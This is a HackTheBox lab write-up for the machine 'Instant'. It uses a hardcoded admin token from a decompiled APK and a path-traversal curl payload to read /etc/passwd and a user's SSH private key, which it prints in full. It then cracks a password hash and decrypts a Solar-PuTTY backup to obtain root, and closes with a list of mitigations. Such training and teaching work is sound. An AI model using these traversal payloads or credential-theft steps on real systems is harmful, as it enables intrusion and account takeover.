---
title: "HTB: Instant"
date: 2026-11-15 18:00:00 +0200
categories: [HackTheBox, Medium, Linux]
tags: [linux, api, android]
description: A medium Linux machine with an insecure API exposed through an APK file
media_subpath: /assets/imgs/posts/instant/
image:
  path: banner.png
  alt: HTB - Instant
# Optional switches (defaults shown):
# toc: true
# comments: true
# pin: false
# render_with_liquid: true   # set to false if code blocks contain {{ }} or {% %}
---

Instant is a medium Linux machine which is not that hard if you know how to reverse an APK file and enumerate APIs. The Android app has a privileged endpoint with hardcoded admininistrator token which allows us to access sensitive endpoints. One of the endpoints allows us to read logs and is vulnerable to local file read which we use to read the private SSH key of a user and get a foothold on the box. We then crack one of the password hashes of the web application and find a backup session file that contains a password for root, leading to full compromise.

> As this is a medium machine, I will skip some explanations and assume the reader has background in pentesting APIs.
{: .prompt-info }

# Enumeration
We scan the ports of the machine and find that only ports `22` and `80` are open.
## nmap
```bash
$ nmap -p- --min-rate 10000 -oA nmap/allports-instant 10.129.231.155
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-09 19:13 +0100
Nmap scan report for 10.129.231.155
Host is up (0.027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.31 seconds
```

Next, let's run service scan only on the ports we found.
```bash
$ nmap -p22,80 -sC -sV --reason -oA nmap/instant 10.129.231.155
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-09 19:13 +0100
Nmap scan report for 10.129.231.155
Host is up, received reset ttl 63 (0.030s latency).

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://instant.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.11 seconds
```
We find in the nmap output that the `http` server on port `80` is running `apache httpd 2.4.58`. We also see that it's trying to redirect us to `instant.htb`, so let's add that to the hosts file
```bash
$ echo -e "10.129.231.155\tinstant.htb" | sudo tee -a /etc/hosts
10.129.231.155	instant.htb
```
Let's check the website.
## instant.htb
![http://instant.htb/](http-landing-page.png)
_http://instant.htb/_
The `DOWNLOAD NOW` button links to `http://instant.htb/downloads/instant.apk`. Clicking on it downloads an `apk` file. `apk` is the file format for Android applications. From here, we can either run the program in an android emulator and do dynamic analysis, or de-compile the binary and do static analysis. While each method has its advantages and disadvantages, I decided to go for static analysis for this machine. We can use [`jadx`](https://github.com/skylot/jadx) to decompile the app and check the source code.

> You can install `jadx` by `apt install jadx` on Kali Linux.

{: .prompt-info }

## Static Analysis of instant.apk
After downloading `instant.apk` and copying it to the working directory, let's open it using `jadx-gui`
```bash
$ jadx-gui $(pwd)/instant.apk                                                                          
INFO  - Checking for updates...
INFO  - Update channel: STABLE, current version: 1.5.6
INFO  - output directory: instant
INFO  - loading ...
```
Clicking on the magnifying glass icon in the toolbar at the top, we can search for keywords inside the application. We can start by searching the domain name of the application, which would show if there are any `http` requests sent to the application.

![JADX](jadx-search-domain.png)
_Searching for instant.htb in the code_

The `AdminActivities` file has a call to `http://mywalletv1.instant.htb/api/v1/view/profile`. What is interesting is the hardcoded `Authorization` header. Given the name of the file, one could assume that this is the authorization token for an admin user.

We can try sending a request to `http://mywalletv1.instant.htb/api/v1/view/profile` without the header and see the behavior.

![BurpUnauthorized](burp-unauthorized-profile.png)
_Unauthorized access to /view/profile_

If the header is provided, we get a different response.

![BurpAdmin](burp-admin-profile.png)
_Admin profile information using hardcoded token_

Okay, so now we are essentially the administrator user on the application, but we do not know what to do with that. Let's take a look again at instances of the domain name in the code. This time, let's include resources so that we see results in `xml` files.

![JADXAgain](jadx-other-calls.png)
_security_config.xml has the api documentation endpoint_

The subdomain `swagger-ui.instant.htb` seems to be the documentation of the API `mywalletv1.instant.htb`. API docs are useful for developers using the API to know what endpoints they can access. They might also expose endpoints that are not used in the application.

## Swagger API Documentation
After adding `swagger-ui.instant.htb` to `/etc/hosts`, opening `http://swagger-ui.instant.htb` shows the following page

![Swagger](swagger.png)
_Swagger API documentation_

If we click on the `Authorize` button, we can add the admin token we retrieved earlier to be able to make privileged calls directly from Swagger.

Looking around, there is an endpoint `/api/v1/admin/list/users` which lists the users of the application. If we call that endpoint (with the admin token) we get two users

```json
{
  "Status": 200,
  "Users": [
    {
      "email": "admin@instant.htb",
      "role": "Admin",
      "secret_pin": 87348,
      "status": "active",
      "username": "instantAdmin",
      "wallet_id": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
    },
    {
      "email": "shirohige@instant.htb",
      "role": "instantian",
      "secret_pin": 42845,
      "status": "active",
      "username": "shirohige",
      "wallet_id": "458715c9-b15e-467b-8a3d-97bc3fcf3c11"
    }
  ]
}
```

The endpoint exposes the secret pin of the user. While this is not a part of the machine, it has a Broken Object Property-Level Authorization Vulnerability. Even administrators should not be able to see the PIN of other users.

### Local File Read
There is another endpoint `/api/v1/admin/read/log` that accepts a parameter `log_file_name`. This could be vulnerable to local file read. Swagger also gives us the curl command we can use to replicate the request instead of using the Web-UI for requests.
```bash
$ curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```
Here, I used a typical URL-encoded Local File Read payload to read `/etc/passwd`. The output is the content of the file, which confirms the vulnerability.
```json
{
  "/home/shirohige/logs/../../../../../../../etc/passwd": [
    "root:x:0:0:root:/root:/bin/bash\n",
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
    "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
    "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n",
    "sync:x:4:65534:sync:/bin:/bin/sync\n",
    "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n",
    "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n",
    "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n",
    "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n",
    "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n",
    "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n",
    "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n",
    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
    "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n",
    "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n",
    "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n",
    "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n",
    "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n",
    "systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n",
    "systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\n",
    "dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n",
    "messagebus:x:101:102::/nonexistent:/usr/sbin/nologin\n",
    "systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin\n",
    "pollinate:x:102:1::/var/cache/pollinate:/bin/false\n",
    "polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin\n",
    "usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n",
    "sshd:x:104:65534::/run/sshd:/usr/sbin/nologin\n",
    "shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash\n",
    "_laurel:x:999:990::/var/log/laurel:/bin/false\n"
  ],
  "Status": 201
}
```
Another thing to note in the result is that its start-point is `/home/shirohige/logs/`. Potentially, the API is running as the user `shirohige`. If that's the case, we can read their private `ssh` key.
```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F.ssh%2Fid_rsa" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

{
  "/home/shirohige/logs/../.ssh/id_rsa": [
    "-----BEGIN OPENSSH PRIVATE KEY-----\n",
    "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\n",
    "-----END OPENSSH PRIVATE KEY-----\n"
  ],
  "Status": 201
}
```

Let's save the ssh key and  try to authenticate as `shirohige`.
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

> After saving the file, it is necessary to change its permissions to `600` since `ssh` does not like private keys with loose permissions.
{: .prompt-info }

 Authenticating as `shirohige` gives us a foothold onto the box.
 ```bash
 $ ssh -i id_rsa shirohige@instant.htb
 Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/pro
 
 This system has been minimized by removing packages and content that are
 not required on a system that users do not log into.
 
 To restore this content, you can run the 'unminimize' command.
 shirohige@instant:~$ cat user.txt
 74f9856e52ce396d139c3572b5d1deba
 ```

# Privilege Escalation
TODO: Add the hash from instant.db and how you extracted it.

Inside the `projects` directory in `/home/shirohige`, we find the source code for the API. The SQLite database for the API is inside `/home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db`. In there, we can find the password hashes for `administrator` and `shirohige`. The passwords are hashed using `PBKDF2`. I used the script [`pbkdf2-to-hashcat.py`](https://gist.github.com/marcos-venicius/858061c6c5709ad1a2f0e305b65a27f8#file-pbkdf2-to-hashcat-py) to convert it into a format that `hashcat` accepts. `hashcat` manages to crack one of the passwords.
```bash
$ hashcat hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode
<SNIP>
sha256:600000:WW5SZ2puaW0=:yVQajGrUC8Bkl5vERgJQQf+smvL3YnJpcdiignLFUO0=:estrella
```

The user `shirohige` does not use the same password for their account. If we look for other files that `shirohige` owns, we find a backup file in `/opt/backups/Solar-PuTTY/`

```bash
shirohige@instant:/$ find / -user shirohige 2> /dev/null | grep -v ".cache\|systemd\|run\|cgroup\|site-packages\|proc\|/home/shirohige"
/dev/pts/1
/dev/pts/0
/opt/backups
/opt/backups/Solar-PuTTY
/opt/backups/Solar-PuTTY/sessions-backup.dat
```

Searching online for ways to decrypt `Solar-PuTTY` backups, we come across the following [script](https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5#file-solarputtydecrypt-py) (there are a few Windows-only scripts available, but I used a Python script).

```bash
$ python3 solarPuttyDecrypt.py sessions-backup.dat password.txt
[0] password='estrella'

{"Sessions":[{"Id":"066894ee-635c-4578-86d0-d36d4838115b","Ip":"10.10.11.37","Port":22,"ConnectionType":1,"SessionName":"Instant","Authentication":0,"CredentialsID":"452ed919-530e-419b-b721-da76cbe8ed04","AuthenticateScript":"00000000-0000-0000-0000-000000000000","LastTimeOpen":"0001-01-01T00:00:00","OpenCounter":1,"SerialLine":null,"Speed":0,"Color":"#FF176998","TelnetConnectionWaitSeconds":1,"LoggingEnabled":false,"RemoteDirectory":""}],"Credentials":[{"Id":"452ed919-530e-419b-b721-da76cbe8ed04","CredentialsName":"instant-root","Username":"root","Password":"12**24nzC!r0c%q12","PrivateKeyPath":"","Passphrase":"","PrivateKeyContent":null}],"AuthScript":[],"Groups":[],"Tunnels":[],"LogsFolderDestination":"C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"}
```
The session contains a saved credential for the user `root` with the password `12**24nzC!r0c%q12`.

```bash
shirohige@instant:/opt/backups$ su root
Password:
root@instant:/opt/backups# cd /root
root@instant:~# cat root.txt
4c007f76ca5975918372a7ab659ee0c1
```

# Mitigations
* Hardcoding Admin tokens in an application is never a good idea. If some data needs to be accessed by all users, the data should be exposed using an endpoint that does not require authentication.
* Secret-PINS should not be readable by anyone, not even administrators. The API should only respond with appropriate information through ORM objects that respect access-control.
* Avoid passing paths as endpoint parameters, and opt to whitelisted filenames. If filenames cannot be predicted, the full file path must be validated after resolving it to block local file read attempts.
* Run servers and APIs as a low-privileged user (such as `www-data`) so that sensitive files such as private SSH keys of ordinary users are not readable.
* Using strong encryption methods such as `PBKDF2` is not an excuse to have weak passwords.
* Passwords for different services must be unique.
* Sensitive session backups containing stored credentials should not be stored on disk in easily accessible locations. A secure file manager should be used.
